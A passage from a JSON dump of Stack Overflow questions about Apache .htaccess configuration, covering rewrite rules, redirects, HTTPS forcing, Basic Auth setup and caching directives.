[R=301,nc]\n</code></pre>\n\n<p>I then have a separate <code>.htaccess</code> file in each directory, also removing the <code>index.php</code> from the URL, as shown here in the <code>/products</code> directory:</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^index.php$ http://www.example.com/products/ [r=301,nc]\n</code></pre>\n\n<p>When I (after clearing my cache) visit <code>example.com</code> I am redirected to <code>www.example.com/</code>as expected.</p>\n\n<p>But if I type <code>example.com/products</code> in my address bar, the page loads as <code>example.com/products/</code> and I am <strong>NOT</strong> redirected to the <code>www.example.com/products/</code> version.  What am I doing wrong? Please help... and I can provide a better explaination/examples if necessary.</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12410704,"title":"Redirect all incoming traffic on a domain to non-www HTTPS","body":"<p>I thought I could get this accomplished using the following, but it's looping...</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^example.com [NC,OR]\nRewriteCond %{HTTP_HOST} ^www.example.com [NC]\nRewriteCond %{HTTPS_HOST} ^www.example.com [NC]\nRewriteRule ^(.*)$ https://example.com/$1 [L,R=301]\n</code></pre>\n\n<p>What do I need to do to make sure all instances of the domain go to <a href=\"https://example.com\" rel=\"nofollow\">https://example.com</a> without looping?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12679673,"title":"RewriteRule giving 500 error when adding dynamic id at url end","body":"<p>I am getting a 500 Internal Server Error from my linked CSS files etc when I use this htaccess code.. Anyone know what might be the problem? I am not too fluent in htaccess yet.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\nRewriteRule ^(system|img|res) - [L]\n\nRewriteRule ^picture/([^/]*)/?$ picture.php?id=$1 [L,QSA]\n\n## The below code is something I found on the internet to remove the .php tag\n# remove .php; use THE_REQUEST to prevent infinite loops\nRewriteCond %{HTTP_HOST} ^www\\.mywebsite\\.com\nRewriteCond %{THE_REQUEST} ^GET\\ (.*)\\.php\\ HTTP\nRewriteRule (.*)\\.php$ $1 [R=301]\n\n# remove index\nRewriteRule (.*)index$ $1 [R=301]\n\n# remove slash if not directory\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_URI} /$\nRewriteRule (.*)/ $1 [R=301]\n\n# add .php to access file, but don't redirect\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteCond %{REQUEST_URI} !/$\nRewriteRule (.*) $1\\.php [L]\n</code></pre>\n\n<p>The URL is supposed to be: www.mysite.com/pictures/1 (id)</p>\n\n<p>The id is always a number.</p>\n\n<p>It does show me the page and I can echo the id, so that part is working, however it gives me a 500 error on linked files as mentioned above.</p>\n"},{"tags":[".htaccess","redirect","ip"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12588957,"title":"htaccess redirect from subdomain to ip [RESOLVED]","body":"<p>I have an alias like <strong>*.domain.com</strong> to <strong>domain.com</strong>. </p>\n\n<p>So, I need to do a redirect from <strong>a.domain.com</strong> to a specific <strong>IP</strong> and on the other sub domain like <strong>b.domain.com</strong> or <strong>z.domain.com</strong> send error 404.</p>\n\n<p>I understand that it is necessary to dig into <strong>.htaccess</strong> but can not find the right solution. Please help solve the problem. Thank you.</p>\n"},{"tags":["apache",".htaccess","http"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":19,"score":2,"question_id":12678605,"title":"Force SSL except on the homepage index.php using .htccess","body":"<p>I want to force every page on my website to use SSL (https) except the homepage index.php using .htccess</p>\n"},{"tags":["security",".htaccess","authentication",".htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":199,"score":0,"question_id":3936788,"title":"htaccess & htpasswd not hooking up correctly","body":"<p>Every time I try to go to <a href=\"http://www.public.asu.edu/~rlpeck/CSE465a/art.htm\" rel=\"nofollow\">Art School</a> on  <a href=\"http://www.public.asu.edu/~rlpeck/\" rel=\"nofollow\">Home Page</a> and put it the correct username/password I get a server error. Yes this is homework, and yes it is my first time doing anything related to this type of setup so any help would be appreciated. All the various instructions that I found listed this as the correct way so I'm sort of stuck.</p>\n\n<p>.htpasswd file(<code>/afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd</code>):</p>\n\n<pre><code>Alice:$apr1$sgDEa/..$FBtlSGHkbPHmlW80Sj2Sx1\nBob:$apr1$V8LLa/..$iX.YVKHoDfKyTKEMvuX.g/\nChris:$apr1$XuHOa/..$o6bf/JyA1otkH0jor4n5c/\nDave:$apr1$hpjQa/..$u3/D.f0xdN23Flg35qp9g.\nEve:$apr1$JIGSa/..$uTs55qYH1.gtDV7WZ0X7q0\n</code></pre>\n\n<p>.htaccess file(<code>/afs/asu.edu/users/r/l/p/rlpeck/www/CSE465a</code>):</p>\n\n<pre><code>AuthType Basic\nAuthName \"Restricted Area\"\nAuthUserFile /afs/asu.edu/users/r/l/p/rlpeck/pwd/.htpasswd\nAuthGroupFile /dev/null\nRequire valid-user\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/ooIf2.pngBlockquote\" alt=\"Server Error\"></p>\n\n<p>When I do run  <code>locate -r error.log</code> all I get are these:</p>\n\n<pre><code>/opt/tivoli/tsm/client/ba/bin/dsmerror.log\n/usr/share/doc/cups-1.2.4/de/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/es/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/help/ref-error_log.html\n/usr/share/doc/cups-1.2.4/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/ja/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/pl/images/button-view-error-log.gif\n/usr/share/doc/cups-1.2.4/sv/images/button-view-error-log.gif\n/var/log/cups/error_log\n/var/log/cups/error_log.1\n/var/log/cups/error_log.2\n</code></pre>\n\n<p>Edit: Response from help desk:</p>\n\n<blockquote>\n  <p>If you were testing the security of your page, you passed. I dont see an error</p>\n</blockquote>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12674210,"title":"How would I setup a URL rewrite for this?","body":"<p>I tried a few different things, but came up unsuccessful.</p>\n\n<p>Basically, I've got some very ugly urls.</p>\n\n<pre><code>http://example.com/index.php?p=1_4_Contact-Us\nhttp://backlinktuners.com/index.php?p=1_2_Services\n</code></pre>\n\n<p>I would like them to just be simple like,</p>\n\n<pre><code>http://example.com/contact-us\n</code></pre>\n\n<p>How would I go about doing that?</p>\n\n<p>Thanks!</p>\n"},{"tags":["wordpress",".htaccess","redirect","dynamic"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12675030,"title":"How to redirect entire wordpress folder with dynamic URLs to a single page","body":"<p>I had old wordpress blog which was under mywebsite.com/wordpress</p>\n\n<p>Now I have moved this blog but I would like to redirect the entire wordpress folder to a single category page mywebsite.com/category/test</p>\n\n<p>The problem is that I don't know how to redirect dynamic pages (all at once) such as \n<br>wordpress/?p=1\n<br>wordpress/?p=2\n<br>wordrpess/?page_id=1362</p>\n\n<p>and others. </p>\n\n<p>I don't need a page to page redirect, just an entire redirect from the wordpress folder to one single category page.</p>\n"},{"tags":["regex",".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12644984,"title":"Htaccess redirect urls that match with Regular expression","body":"<p>I'm trying to redirect any url's that match the following criteria:</p>\n\n<pre><code>old-domain.com/marketplace/businesses/anything-here/ads/\nold-domain.com/marketplace/businesses/anything-here/ads/anyhting-after-this-too\nold-domain.com/marketplace/businesses/anything-here/ads/anyhting-after-this-too/anyhting-after-this-too/\netc...\n</code></pre>\n\n<p>to </p>\n\n<pre><code>new-domain.com/deal/\n</code></pre>\n\n<p>This is what my <code>.htaccess</code> file looks like    </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteBase /\n    RewriteRule ^marketplace/businesses/([a-z0-9\\-_]+)/ads/(.*) http://new-domain.com/deal/ [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>I've tried several variations os this including swapping the <code>([a-z0-9\\-_]+)</code> with <code>([A-Za-z0-9_-\\s\\.]+)</code> and <code>[a-zA-Z-_0-9]+)</code> and other combos but I can't seem to get it to work. </p>\n\n<p>Also notice where I said <code>anything-here</code> in the urls that means I want to be able to match pretty much anything that would be there.</p>\n\n<p>Any help would be appreciated.</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12389723,"title":".htaccess get 3rd level folder file content to 2nd level folder file","body":"<p>I want to point</p>\n\n<p><a href=\"http://example.com/folder1/folder2/folder3/index.php\" rel=\"nofollow\">http://example.com/folder1/folder2/folder3/index.php</a></p>\n\n<p>to</p>\n\n<p><a href=\"http://example.com/folder1/folder2/index.php\" rel=\"nofollow\">http://example.com/folder1/folder2/index.php</a></p>\n\n<p>Anyone can help me?</p>\n"},{"tags":["regex",".htaccess","redirect","yii","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12671050,"title":"htaccess redirect in Yii","body":"<p>I am using Yii framework, and I have a problem with redirect. I want to redirect from a old url which apears in google search to my homepage. But the redirect does not get effected and I get the 404 error. Can I specify somehow that .htm extentions wouldn't get 404 error and instead redirect to the homepage?</p>\n\n<p>Here is the redirect in my htaccess file:</p>\n\n<pre><code>Redirect /file\\s_mostra_milano/mostra_marionette-milano.htm http://marionettecolla.org/\n</code></pre>\n\n<p>the old url is this:</p>\n\n<pre><code>http://www.marionettecolla.org/file%20_mostra_milano/mostra_marionette-milano.htm\n</code></pre>\n\n<p>and I want to redirect it to the home page:</p>\n\n<pre><code>http://www.marionettecolla.org/\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","nginx","rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12672827,"title":"Want to convert this .htaccess rule into nginx","body":"<p>I am new to nginx and really don't have any idea how to do this. What this below code essentially does in htaccess is for example </p>\n\n<p>if a browser requests this css file from this web address</p>\n\n<pre>http://www.example.com/folder1/css/style-30493094.css</pre>\n\n<p>then it shows this file</p>\n\n<pre>http://www.example.com/folder1/css/style.css</pre>\n\n<p>Same goes for all other defined extensions in this code. css, js, png, jpg, gif\nLike if a browser requests this js file from this web address</p>\n\n<pre>http://www.example.com/folder1/js/javascript-2938293.js</pre>\n\n<p>then it shows this file</p>\n\n<pre>http://www.example.com/folder1/js/javascript.js</pre>\n\n<p>Actually I am trying to accomplish this. <a href=\"http://derek.io/blog/2009/auto-versioning-javascript-and-css-files/\" rel=\"nofollow\">http://derek.io/blog/2009/auto-versioning-javascript-and-css-files/</a></p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^folder1/(css|js|images)/([a-z]+)-([0-9]+)\\.(css|js|png|jpg|gif)$ /folder1/$1/$2.$4 [L]\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12277927,"title":"Can I use one htaccess file to 301 redirect a list of files another domain and with files changing name","body":"<p>I am moving a website to another domain, and at the same time I am changing the website structure and file names.<br > \nSo each of my old files needs to be redirected to a new domain and to a different file name, often in a different folder. <br />\nCan this be done with a single .htaccess file in which I list the old and new files? <br />How would this .htaccess look?<br />\nAnd where to put this htaccess? Only in the root or in every folder?\n<br >Or is there another solution to this problem?</p>\n"},{"tags":["php","apache",".htaccess","url","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12441481,"title":"Hide home page and index page name from url","body":"<p>I have a website, say www.example.com (not actual name).\nIn this website I have </p>\n\n<blockquote>\n  <p>index.php (first page of website before login) and home.php (first\n  page of website after login)</p>\n</blockquote>\n\n<p>As my DirectoryIndex index.php(in .htaccess), index.php does not appear in address bar. But when logged in, it shows home.php as a part of link.</p>\n\n<p>I <strong>don't</strong> want to <strong>show \"home.php\" in url</strong>. I was thinking to use some url rewrite rules in .htaccess, but I'm stuck.</p>\n\n<p>Is there any easy solution for this?</p>\n\n<p>Please let me know if you guys need any other system/server related info, if required.</p>\n\n<p>//Edit\nI got this idea from facebook.com. </p>\n"},{"tags":[".htaccess","url-shortener"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12660668,"title":".htaccess help shortening a url","body":"<p>i have been working on setting up a url shortener with codeigniter i have everything working great and it works now with shortened urls like below.</p>\n\n<p><a href=\"http://example.com/shorten/i/znAS\" rel=\"nofollow\">http://example.com/shorten/i/znAS</a></p>\n\n<p>ok what am looking to do is shorten it just to the i with my .htaccess access i am a complete newbie with .htaccess and have no idea how to do this is have been following this example here. <a href=\"http://briancray.com/posts/free-php-url-shortener-script/\" rel=\"nofollow\">http://briancray.com/posts/free-php-url-shortener-script/</a></p>\n\n<p>which uses</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^shorten/(.*)$ shorten.php?longurl=$1 [L]\nRewriteRule ^([0-9a-zA-Z]{1,6})$ redirect.php?url=$1 [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Above is not really relevant for mine as its code igniter based. ok so shorten is my controller and i have a function within called i, </p>\n\n<p>i have tried various combinations but nothing has worked for me yet below is my .htaccess.</p>\n\n<pre><code>Options         +FollowSymLinks\nOptions         -Indexes \nDirectoryIndex  index.php\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^shorten/(.*)$ shorten/i/=$1 [L]\n#RewriteRule ^(.*)$ index.php/$1 [L]\nRewriteRule ^(.*)$ index.php?/$1 [L]  \n\n&lt;Files \"index.php\"&gt;\nAcceptPathInfo On\n&lt;/Files&gt; \n</code></pre>\n\n<p>whats there is currently breaking the website at the moment just looking and google at the mo but thought i would also add a post here as well thanks</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12597459,"title":"Exclude image urls from redirection using htaccess","body":"<p>My old blog was at www.example.com/myblog\nI changed my server and I want to use www.example.com/blog</p>\n\n<p>To do this I used htaccess code\nRedirect 301 /myblog <a href=\"http://www.example.com/blog\" rel=\"nofollow\">http://www.example.com/blog</a></p>\n\n<p>This helped in redirecting the blog home page and individual blog posts.</p>\n\n<p>The images were put in a folder named myblog in the new server.\nSo the image url is www.example.com/myblog/wp-content/uploads/2010/04/something.jpg</p>\n\n<p>But the htaccess I wrote above redirects this to www.example.com/blog/wp-content/uploads/2010/04/something.jpg which returns 404.</p>\n\n<p>Can anyone help me to write htaccess code for redirecting blog post urls only excluding the blog image urls? </p>\n"},{"tags":[".htaccess","mamp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3024,"score":1,"question_id":7670561,"title":"How to get htaccess to work on MAMP","body":"<p>I am trying to get the htaccess working in mamp</p>\n\n<p>The content of the htaccess is a simple redirect line but it does not work. I am trying to manipulate urls of a wordpress page, so I added the .htaccess file in my theme folder, but it is not working</p>\n\n<p>is there any settings within MAMP i need to change to get the htaccess to work</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess","redirect","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12669925,"title":"How to do a simple url-rewrite with .htaccess","body":"<p>.htaccess file located in my local computer with this path localhost/test/</p>\n\n<p>How to write a redirect url like</p>\n\n<pre><code>localhost/test/errorsample\n</code></pre>\n\n<p>to</p>\n\n<pre><code>localhost/test/index.php?req_dir=$var\n</code></pre>\n\n<p>in my index.php</p>\n\n<pre><code>&lt;?php\n    echo ($_GET['req_dir']);\n?&gt;\n</code></pre>\n\n<p>so it should show <code>errorsample</code></p>\n"},{"tags":["php",".htaccess","redirect"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12669271,"title":"PHP .htacces and index.php redirection","body":"<p>I am new about this  redirection and I want to know how it works?\nI have some file called index.php and i want to hadlle it any directory in the site</p>\n\n<pre><code> index.php\n\n&lt;?php \n    if(empty($dir)){\n    include('includes/home.php');\n    }  \n    if($dir=='profile'){\n    include('includes/profile.php');\n    }\n    elseif($dir=='settings'){\n    include('includes/settings.php');\n    }\n    else{\n    include('includes/404.php');\n    }\n    ?&gt;\n</code></pre>\n\n<p>The url is:</p>\n\n<pre><code>test 1. www.example.com/ - will view the include home.\ntest 2. www.example.com/settings - will view the include  settings.\ntest 3. www.example.com/errorsample - will view the include   404 page.\n</code></pre>\n\n<p>How to make <code>.htaccess</code> and index.php using that code or any idea how it works and sample code of it.</p>\n"},{"tags":["string","query",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":33,"score":-1,"question_id":12669055,"title":"htaccess: remove query strings","body":"<p>in my website I have a lot of images like these:</p>\n\n<p>www.mysite.com/images/a.jpg&amp;image=0</p>\n\n<p>www.mysite.com/images/bc.jpg&amp;image=0</p>\n\n<p>www.mysite.com/images/def.jpg&amp;image=0</p>\n\n<p>I would like to 301 redirect these images in order to remove the \"image=0\" query string so that the links would be rewritten like</p>\n\n<p>www.mysite.com/images/a.jpg</p>\n\n<p>How could I achieve this result? Thanks</p>\n"}]}
{"total":14528,"page":13,"pagesize":100,"questions":[{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":12668829,"title":"Correct htaccess config for multisite resource load","body":"<p>I am experiencing this problem for wordpress multi sites . I have enabled network of blogs . So now I create many blogs in my wp and visit subblog via myblog.com/sublog  . But the problem is that resources in the subblog starting with myblog.com/sublog ..  dont load like css images etc . But the resources without subblog in the url are working . SO how to configure htaccess to omit that subblog part so it can load the resources correctly in subblogs ?</p>\n"},{"tags":[".htaccess","iis","url-rewriting","plesk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12637780,"title":"Plesk ignores .htaccess file","body":"<p>I am very new to URL re-writting and I am using Plesk which is <strong>Windows based</strong> web server and hence I cant use Apache's mod_Rewrite.. can anyone tell me steps for this to happen?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":7,"score":0,"question_id":12666773,"title":"htacess conditional rewrite","body":"<p>I'm trying to block public access to a CodeIgniter controller function but this .htaccess rule just won't work:-</p>\n\n<pre><code>#Block External Access to create pdfs function\nRewriteCond %{REMOTE_ADDR} !^127\\.0\\.0\\.0\nRewriteCond %{REMOTE_ADDR} !^x\\.x\\.x\\.x\nRewriteCond %{REQUEST_URI} ^/applicationForm/createPDF\nRewriteRule ^(.*)$ index.php/$1 [F,L]\n</code></pre>\n\n<p>note the x's have been replaced with the servers public IP</p>\n\n<p>I just can't see why this won't work. Any ideas gratefully received</p>\n\n<p>The rest of the mod rewrites are working fine:-</p>\n\n<pre><code>#Removes access to the system folder by users.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\nRewriteCond %{REQUEST_URI} ^application.*\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n\n#Checks to see if the user is attempting to access a valid file,\n#such as an image or css document, if this isn't true it sends the\n#request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n"},{"tags":["internet-explorer",".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12666684,"title":"Redirect IE 6, 7 and 8 users with htaccess","body":"<p>How can I redirect users for IE versions 6-8 with htaccess to a certain directory (mysite.com/ie)?</p>\n\n<p>Note: I am using Wordpress.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12343181,"title":".htaccess tricks for multi-language website","body":"<p>Right now, I have a website that uses two languages (French and English). </p>\n\n<p>The way it currently works is that if someone goes to <code>mysite.com/folder/file.php</code> for example, <code>file.php</code> is simply a script that figures out which language to use, gets it's own path and filename (<code>file.php</code>) and serves up <code>mysite.com/en/folder/file.php</code> (if the language is English). However, what shows up in the URL is still <code>mysite.com/folder/file.php</code>.</p>\n\n<p>For any folder and any file, the same script is used. If I want to add a new file, I have to add the file to the folder the user types into the browser as well to the <code>en</code> and <code>fr</code> folders.  </p>\n\n<p>Could I do some <code>.htaccess</code> tricks so that whatever URL is typed, one <code>.php</code> file gets opened, checks the language and the folder/file which is requested, and then serves up the correct language file?</p>\n\n<p>Here's the php file that is served up for any files in the URL.</p>\n\n<pre><code>&lt;?php \n\n// Get current document path which is mirrored in the language folders\n$docpath = $_SERVER['PHP_SELF'];\n\n// Get current document name (Used when switching languages so that the same\ncurrent page is shown when language is changed)\n$docname = GetDocName();\n\n//call up lang.php which handles display of appropriate language webpage.\n//lang.php uses $docpath and $docname to give out the proper $langfile.\n//$docpath/$docname is mirrored in the /lang/en and /lang/fr folders\n$langfile = GetDocRoot().\"/lang/lang.php\";\ninclude(\"$langfile\"); //Call up the proper language file to display\n\nfunction GetDocRoot()\n{\n $temp = getenv(\"SCRIPT_NAME\");\n $localpath=realpath(basename(getenv(\"SCRIPT_NAME\")));\n $localpath=str_replace(\"\\\\\",\"/\",$localpath);\n $docroot=substr($localpath,0, strpos($localpath,$temp));\n return $docroot;\n}\n\nfunction GetDocName()\n{\n$currentFile = $_SERVER[\"SCRIPT_NAME\"];\n$parts = Explode('/', $currentFile);\n$dn = $parts[count($parts) - 1];\nreturn $dn;\n}\n\n?&gt;\n</code></pre>\n"},{"tags":[".htaccess","symfony2","rewrite","rules"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1371,"score":2,"question_id":11149526,"title":"symfony2 rewrite rules .htaccess app.php","body":"<p>I uploaded my symfony2 project to server grove. The main page loads, but all the links are broken. I tried adding app.php to the web address. It did work, but:</p>\n\n<p>I have routes like this one: </p>\n\n<p>www.something.com/app.php/something</p>\n\n<p>I want them to be:</p>\n\n<p>www.something.com/something.</p>\n\n<p>I've been reading, and I should put some rewrite rules on the .htaccess. </p>\n\n<p>I found these rules, but they don't seem to work:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ app.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php","apache",".htaccess","kohana"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12621401,"title":"RewriteRule on alias url","body":"<p>on query:</p>\n\n<pre><code>domain.com/page/do\n</code></pre>\n\n<p>i need:</p>\n\n<pre><code>domain.com/index.php/page/do\n</code></pre>\n\n<p>etc.</p>\n\n<p>i use htaccess file, i add alias</p>\n\n<pre><code>RewriteBase /index.php/\n</code></pre>\n\n<p>How i write RewriteRule to this url?</p>\n"},{"tags":[".htaccess","url","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12663996,"title":"SeoUrl and .htacces settings","body":"<p>I try to make my site run with seo when i access\n<strong>mysite.com/search/eminem/1/video.html</strong> \nto give me the results for this url \n<strong>mysite.com/index.php?search=eminem&amp;page=1&amp;type=video</strong>\nAnd it show me the search page but with no results no images or javascripts etc. Is like css and js's are not implemented</p>\n\n<p>this is my .htacces code</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine on\n    RewriteRule ^search/(.*)/(.*)/(.*).html?$ index.php?search=$3&amp;page=$2&amp;type=$1 [L]\n&lt;IfModule mod_deflate.c&gt;\n        &lt;FilesMatch \"\\.(php|js|css|mp3|wmv|flv|html|htm)$\"&gt;\n            SetOutputFilter DEFLATE\n        &lt;/FilesMatch&gt;\n    &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12664650,"title":".htaccess on wordpress : How to add trailing end slash to main page's url","body":"<p>I have following codes in my .htaccess :</p>\n\n<pre><code># BEGIN W3TC Browser Cache\n&lt;IfModule mod_mime.c&gt;\n    AddType text/css .css\n    AddType application/x-javascript .js\n    AddType text/x-component .htc\n    AddType text/html .html .htm\n    AddType text/richtext .rtf .rtx\n    AddType image/svg+xml .svg .svgz\n    AddType text/plain .txt\n    AddType text/xsd .xsd\n    AddType text/xsl .xsl\n    AddType text/xml .xml\n    AddType video/asf .asf .asx .wax .wmv .wmx\n    AddType video/avi .avi\n    AddType image/bmp .bmp\n    AddType application/java .class\n    AddType video/divx .divx\n    AddType application/msword .doc .docx\n    AddType application/vnd.ms-fontobject .eot\n    AddType application/x-msdownload .exe\n    AddType image/gif .gif\n    AddType application/x-gzip .gz .gzip\n    AddType image/x-icon .ico\n    AddType image/jpeg .jpg .jpeg .jpe\n    AddType application/vnd.ms-access .mdb\n    AddType audio/midi .mid .midi\n    AddType video/quicktime .mov .qt\n    AddType audio/mpeg .mp3 .m4a\n    AddType video/mp4 .mp4 .m4v\n    AddType video/mpeg .mpeg .mpg .mpe\n    AddType application/vnd.ms-project .mpp\n    AddType application/x-font-otf .otf\n    AddType application/vnd.oasis.opendocument.database .odb\n    AddType application/vnd.oasis.opendocument.chart .odc\n    AddType application/vnd.oasis.opendocument.formula .odf\n    AddType application/vnd.oasis.opendocument.graphics .odg\n    AddType application/vnd.oasis.opendocument.presentation .odp\n    AddType application/vnd.oasis.opendocument.spreadsheet .ods\n    AddType application/vnd.oasis.opendocument.text .odt\n    AddType audio/ogg .ogg\n    AddType application/pdf .pdf\n    AddType image/png .png\n    AddType application/vnd.ms-powerpoint .pot .pps .ppt .pptx\n    AddType audio/x-realaudio .ra .ram\n    AddType application/x-shockwave-flash .swf\n    AddType application/x-tar .tar\n    AddType image/tiff .tif .tiff\n    AddType application/x-font-ttf .ttf .ttc\n    AddType audio/wav .wav\n    AddType audio/wma .wma\n    AddType application/vnd.ms-write .wri\n    AddType application/vnd.ms-excel .xla .xls .xlsx .xlt .xlw\n    AddType application/zip .zip\n&lt;/IfModule&gt;\n&lt;IfModule mod_expires.c&gt;\n    ExpiresActive On\n    ExpiresByType text/css A31536000\n    ExpiresByType application/x-javascript A31536000\n    ExpiresByType text/x-component A31536000\n    ExpiresByType text/html A691200\n    ExpiresByType text/richtext A691200\n    ExpiresByType image/svg+xml A691200\n    ExpiresByType text/plain A691200\n    ExpiresByType text/xsd A691200\n    ExpiresByType text/xsl A691200\n    ExpiresByType text/xml A691200\n    ExpiresByType video/asf A31536000\n    ExpiresByType video/avi A31536000\n    ExpiresByType image/bmp A31536000\n    ExpiresByType application/java A31536000\n    ExpiresByType video/divx A31536000\n    ExpiresByType application/msword A31536000\n    ExpiresByType application/vnd.ms-fontobject A31536000\n    ExpiresByType application/x-msdownload A31536000\n    ExpiresByType image/gif A31536000\n    ExpiresByType application/x-gzip A31536000\n    ExpiresByType image/x-icon A31536000\n    ExpiresByType image/jpeg A31536000\n    ExpiresByType application/vnd.ms-access A31536000\n    ExpiresByType audio/midi A31536000\n    ExpiresByType video/quicktime A31536000\n    ExpiresByType audio/mpeg A31536000\n    ExpiresByType video/mp4 A31536000\n    ExpiresByType video/mpeg A31536000\n    ExpiresByType application/vnd.ms-project A31536000\n    ExpiresByType application/x-font-otf A31536000\n    ExpiresByType application/vnd.oasis.opendocument.database A31536000\n    ExpiresByType application/vnd.oasis.opendocument.chart A31536000\n    ExpiresByType application/vnd.oasis.opendocument.formula A31536000\n    ExpiresByType application/vnd.oasis.opendocument.graphics A31536000\n    ExpiresByType application/vnd.oasis.opendocument.presentation A31536000\n    ExpiresByType application/vnd.oasis.opendocument.spreadsheet A31536000\n    ExpiresByType application/vnd.oasis.opendocument.text A31536000\n    ExpiresByType audio/ogg A31536000\n    ExpiresByType application/pdf A31536000\n    ExpiresByType image/png A31536000\n    ExpiresByType application/vnd.ms-powerpoint A31536000\n    ExpiresByType audio/x-realaudio A31536000\n    ExpiresByType image/svg+xml A31536000\n    ExpiresByType application/x-shockwave-flash A31536000\n    ExpiresByType application/x-tar A31536000\n    ExpiresByType image/tiff A31536000\n    ExpiresByType application/x-font-ttf A31536000\n    ExpiresByType audio/wav A31536000\n    ExpiresByType audio/wma A31536000\n    ExpiresByType application/vnd.ms-write A31536000\n    ExpiresByType application/vnd.ms-excel A31536000\n    ExpiresByType application/zip A31536000\n&lt;/IfModule&gt;\n&lt;IfModule mod_deflate.c&gt;\n    &lt;IfModule mod_setenvif.c&gt;\n        BrowserMatch ^Mozilla/4 gzip-only-text/html\n        BrowserMatch ^Mozilla/4\\.0[678] no-gzip\n        